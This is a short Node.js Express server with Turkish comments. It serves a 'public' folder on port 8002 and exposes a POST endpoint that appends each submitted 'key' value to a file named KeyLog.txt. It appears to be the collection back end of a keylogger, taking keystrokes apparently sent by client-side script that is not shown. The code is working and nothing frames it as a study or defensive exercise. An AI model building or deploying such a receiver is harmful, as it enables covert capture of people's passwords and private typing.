

//Dependencies

var express = require('express'); //Node.js web uygulama çatısı. Web uygulamaları geliştirmek için kullanılır.
var app = express();
var path = require('path');
var bodyParser = require('body-parser'); // get parameters from a request

var fs = require('fs');

// Statik içeriklerin (resim, css, js vb.) istemcilere gönderilebilmesi için yol tanımı yapılıyor. express.static fonksiyonu(express çerisinde tanımlı) fonksiyonu kullanılıyor.
app.use("/",express.static(path.join(__dirname, 'public'))); // (virtual path prefix)ana klasördeki public klasörü kök dizin olarak tanımlanır
app.listen(8002);
console.log('8002 Portu dinleniyor...');



var router = express.Router();

app.use(bodyParser.urlencoded({ extended: true })); //express middleware - parse application/x-www-form-urlencoded
app.use('/RestAPI', router);

/*
router.get('/', function(req, res) {
    res.json({ message: 'Rest API Ana Dizini ' });
});
*/


router.post('/',function(req, res) {

    console.log(req.body.key);



    fs.appendFile(__dirname+'/KeyLog.txt',req.body.key , function (err) {
        if (err) throw err;
        console.log('Saved!');
    });




});


